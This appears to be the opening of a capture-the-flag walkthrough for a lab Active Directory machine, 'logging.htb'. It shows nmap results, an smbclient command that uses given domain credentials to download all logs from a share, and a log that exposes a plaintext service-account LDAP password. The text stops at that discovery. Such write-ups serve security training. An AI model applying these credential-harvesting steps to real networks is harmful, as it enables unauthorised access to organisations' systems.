network enumeration:

```
53/tcp    open   domain         Simple DNS Plus  
80/tcp    open   http           Microsoft IIS httpd 10.0  
88/tcp    open   kerberos-sec   Microsoft Windows Kerberos (server time: 2026-04-19 02:02:49Z)  
135/tcp   open   msrpc          Microsoft Windows RPC  
139/tcp   open   netbios-ssn    Microsoft Windows netbios-ssn  
389/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
445/tcp   open   microsoft-ds  
464/tcp   open   kpasswd5  
593/tcp   open   ncacn_http     Microsoft Windows RPC over HTTP 1.0  
636/tcp   open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
3268/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
3269/tcp  open   ldap           Microsoft Windows Active Directory LDAP (Domain: logging.htb., Site: Default-First-Site-Name)  
5985/tcp  open   http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```


```
ajdev@rootbox:~$ smbclient //logging.htb/Logs -U 'logging.htb\wallace.everette%Welcome2026@' \
  -c 'prompt OFF; mget *'
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (11.4 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \Service_State.log of size 468 as Service_State.log (0.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (1.6 KiloBytes/sec) (average 3.1 KiloBytes/sec)
```

`IdentitySync_Trace_20260219.log` contains a plaintext LDAP bind dump:

```
ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  SSL: "False",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2025"
}
```


